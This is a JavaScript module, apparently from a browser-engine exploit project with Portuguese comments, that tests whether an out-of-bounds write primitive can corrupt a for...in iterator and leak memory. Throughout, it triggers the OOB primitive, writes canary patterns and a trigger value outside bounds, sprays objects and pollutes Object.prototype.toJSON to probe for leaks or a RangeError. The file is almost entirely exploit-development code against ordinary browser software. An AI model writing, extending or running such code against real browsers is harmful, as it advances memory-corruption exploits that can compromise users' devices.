// js/script3/testCorruptedIteratorLeak.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    oob_read_absolute, // Para verificar o preenchimento
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

// Mesma classe usada quando o RangeError foi observado
class MyComplexObjectForRangeError {
    constructor(id) {
        this.id = `MyComplexObjRE-${id}`;
        this.marker = 0xFEFEFEFE;
        this.prop1 = "complex_prop1_re";
        this.prop2 = { nested: "complex_prop2_nested_re" };
        this.propA = "valA_re";
        this.propB = 2345689;
        this.propC = null;
        this.propD = { nested_prop_re: "valD_original_re" };
        this.propE = [101, 202, 303];
    }
}

// Padrões para escrever no oob_array_buffer_real
const CANARY_PATTERNS = [
    { offset: 0x100, value: new AdvancedInt64("0xAAAAAAAAAAAAAAAA"), desc: "PatternA" },
    { offset: 0x108, value: new AdvancedInt64("0xBBBBBBBBBBBBBBBB"), desc: "PatternB" },
    { offset: 0x110, value: new AdvancedInt64("0xCCCCCCCCCCCCCCCC"), desc: "PatternC" },
    { offset: 0x118, value: new AdvancedInt64("0xDDDDDDDDDDDDDDDD"), desc: "PatternD" },
    // Adicionar mais padrões se desejar, cobrindo uma área maior
];

// toJSON que loga 'prop' e tenta detectar se 'prop' vem dos nossos canaries
export function toJSON_CaptureCorruptedIteratorProp() {
    const FNAME_toJSON = "toJSON_CaptureCorruptedIteratorProp";
    let iteration_count = 0;
    const MAX_ITER_LOG = 50;
    const MAX_ITER_SAFETY_BREAK = 250;

    let result_payload = {
        variant: FNAME_toJSON,
        id_at_entry: "N/A",
        iterations_done: 0,
        props_enumerated_log: [], // Array para nomes de propriedades
        potential_leaks_as_prop_name: [],
        access_errors: [],
        last_prop_before_error: "N/A",
        range_error_in_loop: false
    };

    try {
        result_payload.id_at_entry = String(this?.id).substring(0,20);
        logS3(`[${FNAME_toJSON}] Entrando. this.id (tentativa): ${result_payload.id_at_entry}`, "info", FNAME_toJSON);
    } catch(e_id) { /* ignora */ }

    try {
        for (const prop in this) {
            iteration_count++;
            result_payload.last_prop_before_error = String(prop); // Atualiza sempre

            if (iteration_count <= MAX_ITER_LOG) {
                logS3(`[${FNAME_toJSON}] Iter: ${iteration_count}, Prop: '${String(prop).substring(0, 100)}'`, "info", FNAME_toJSON);
                result_payload.props_enumerated_log.push(String(prop).substring(0,100));
            }

            // Verificar se 'prop' (o nome da propriedade) corresponde a um dos nossos canários
            for (const canary of CANARY_PATTERNS) {
                // Se prop for uma string e contiver parte de um canary (improvável, mas possível)
                // Ou se prop for um número e corresponder a um canary (mais provável se for ponteiro para string)
                if (typeof prop === 'string' && prop.includes(canary.desc)) { // Muito improvável
                    const leak_info = `POTENCIAL LEAK: Propriedade nomeada '${String(prop)}' parece um canary (${canary.desc})!`;
                    logS3(`[${FNAME_toJSON}]   ${leak_info}`, "critical", FNAME_toJSON);
                    result_payload.potential_leaks_as_prop_name.push(leak_info);
                }
                // Se 'prop' for um número (o que seria estranho para nome de prop, mas possível se o iterador estiver muito quebrado)
                // e esse número corresponder a um canary.value (improvável, pois canaries são QWORDs)
            }

            try {
                const val = this[prop]; // Tenta acessar a propriedade
                                        // Não fazemos muito com 'val' para manter o foco no 'prop' e no RangeError
            } catch (e_access) {
                logS3(`[${FNAME_toJSON}]   ERRO ao acessar this['${String(prop).substring(0,50)}']: ${e_access.name} - ${e_access.message}`, "error", FNAME_toJSON);
                result_payload.access_errors.push(`Error on prop '${String(prop).substring(0,50)}': ${e_access.name}`);
            }

            if (iteration_count >= MAX_ITER_SAFETY_BREAK) {
                logS3(`[${FNAME_toJSON}] Safety break: Excedeu ${MAX_ITER_SAFETY_BREAK} iterações. Última prop: '${String(prop).substring(0,100)}'.`, "warn", FNAME_toJSON);
                result_payload.error_details = `Safety break after ${MAX_ITER_SAFETY_BREAK} iter. Last prop: ${String(prop).substring(0,100)}.`;
                break;
            }
        }
        logS3(`[${FNAME_toJSON}] Loop for...in completou ${iteration_count} iterações.`, "info", FNAME_toJSON);
    } catch (e_loop) {
        // Se o RangeError ocorrer aqui, significa que o próprio 'for...in' quebrou
        logS3(`[${FNAME_toJSON}] EXCEPTION NO MECANISMO for...in: ${e_loop.name} - ${e_loop.message}`, "critical", FNAME_toJSON);
        result_payload.error_details = `EXCEPTION in for...in mechanism: ${e_loop.name}: ${e_loop.message}`;
        if (e_loop.name === 'RangeError') result_payload.range_error_in_loop = true;
    }
    result_payload.iterations_done = iteration_count;
    return result_payload;
}

export async function executeCorruptedIteratorLeakTest() {
    const FNAME_TEST = "executeCorruptedIteratorLeakTest";
    logS3(`--- Iniciando Teste: Vazamento por Iterador Corrompido ---`, "test", FNAME_TEST);
    document.title = `Corrupted Iterator Leak Test`;

    // 1. Setup OOB e preencher com canários
    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST); return;
    }
    logS3(`1. Preenchendo oob_array_buffer_real com padrões canary...`, "info", FNAME_TEST);
    for (const canary of CANARY_PATTERNS) {
        try {
            if (canary.offset + 8 <= oob_array_buffer_real.byteLength) {
                oob_write_absolute(canary.offset, canary.value, 8);
                logS3(`   Padrão ${canary.desc} (${canary.value.toString(true)}) escrito em ${toHex(canary.offset)}`, "info", FNAME_TEST);
            } else {
                logS3(`   AVISO: Padrão ${canary.desc} em ${toHex(canary.offset)} fora dos limites. Pulando.`, "warn", FNAME_TEST);
            }
        } catch (e_fill) {
            logS3(`   ERRO ao escrever padrão ${canary.desc}: ${e_fill.message}`, "error", FNAME_TEST);
        }
    }

    // 2. Spray de MyComplexObjectForRangeError
    const spray_count = 5;
    const sprayed_objects = [];
    logS3(`2. Pulverizando ${spray_count} instâncias de MyComplexObjectForRangeError...`, "info", FNAME_TEST);
    for (let i = 0; i < spray_count; i++) {
        sprayed_objects.push(new MyComplexObjectForRangeError(i));
    }

    await PAUSE_S3(SHORT_PAUSE_S3);

    // 3. Realizar a corrupção OOB "gatilho"
    const corruption_offset_trigger = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    const value_to_write_trigger = 0xFFFFFFFF;
    logS3(`3. Escrevendo valor trigger ${toHex(value_to_write_trigger)} em oob_ab_real[${toHex(corruption_offset_trigger)}] (DENTRO da área de canários)...`, "warn", FNAME_TEST);
    try {
        oob_write_absolute(corruption_offset_trigger, value_to_write_trigger, 4);
    } catch (e_trigger) {
         logS3(`   ERRO ao escrever valor trigger: ${e_trigger.message}. Abortando.`, "error", FNAME_TEST);
         clearOOBEnvironment(); return;
    }


    await PAUSE_S3(SHORT_PAUSE_S3);

    // 4. Poluir Object.prototype.toJSON e tentar
    const ppKey_val = 'toJSON';
    let originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let toJSONPollutionApplied = false;
    let problem_detected = false;
    const obj_to_probe = sprayed_objects[0];

    if (!obj_to_probe) {
        logS3("Nenhum objeto para sondar.", "error", FNAME_TEST);
        clearOOBEnvironment(); return;
    }

    try {
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSON_CaptureCorruptedIteratorProp,
            writable: true, configurable: true, enumerable: false
        });
        toJSONPollutionApplied = true;
        logS3(`4. Object.prototype.toJSON poluído com ${toJSON_CaptureCorruptedIteratorProp.name}.`, "info", FNAME_TEST);

        logS3(`5. Sondando objeto 0 (ID: ${obj_to_probe.id})... ESPERANDO RangeError ou Leaks POTENCIAIS.`, 'warn', FNAME_TEST);
        document.title = `Sondando ${obj_to_probe.id} (CorruptIterLeak)`;
        try {
            const stringifyResult = JSON.stringify(obj_to_probe);
            logS3(`     JSON.stringify(obj[0]) completou. Resultado da toJSON:`, "info", FNAME_TEST);
            logS3(JSON.stringify(stringifyResult, null, 2), "leak", FNAME_TEST);
            if (stringifyResult && stringifyResult.potential_leaks_as_prop_name && stringifyResult.potential_leaks_as_prop_name.length > 0) {
                logS3(`     !!!! POTENCIAL LEAK DE PROPRIEDADE DO ITERADOR CORROMPIDO DETECTADO !!!!`, "critical", FNAME_TEST);
                document.title = "LEAK via Iterador Corrompido!";
                problem_detected = true; // Considerar um sucesso se vazar algo
            }
            if (stringifyResult && stringifyResult.error_details) {
                 logS3(`     Detalhe de erro/aviso da toJSON: ${stringifyResult.error_details}`, "warn", FNAME_TEST);
            }


        } catch (e_str) {
            logS3(`     !!!! ERRO AO STRINGIFY obj[0] !!!!: ${e_str.name} - ${e_str.message}`, "critical", FNAME_TEST);
            if (e_str.stack) logS3(`       Stack: ${e_str.stack}`, "error", FNAME_TEST);
            if (e_str.name === 'RangeError') {
                logS3(`       ---> RangeError: Maximum call stack size exceeded OCORREU! <---`, "vuln", FNAME_TEST);
                document.title = `RangeError REPRODUCED (CorruptIter)!`;
            }
            problem_detected = true;
        }

    } catch (e_main) {
        logS3(`Erro principal no teste: ${e_main.message}`, "error", FNAME_TEST);
        problem_detected = true;
    } finally {
        if (toJSONPollutionApplied) {
            if (originalToJSONProtoDesc) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDesc);
            else delete Object.prototype[ppKey_val];
        }
    }

    if (!problem_detected) {
        logS3("Nenhum problema óbvio (RangeError, Leak de Prop) detectado.", "good", FNAME_TEST);
    }

    clearOOBEnvironment();
    logS3(`--- Teste de Vazamento por Iterador Corrompido CONCLUÍDO ---`, "test", FNAME_TEST);
    if (document.title.includes("LEAK") || document.title.includes("REPRODUCED")) {
        // Manter
    } else if (!problem_detected) {
        document.title = `CorruptIterLeak Test Done`;
    }
}
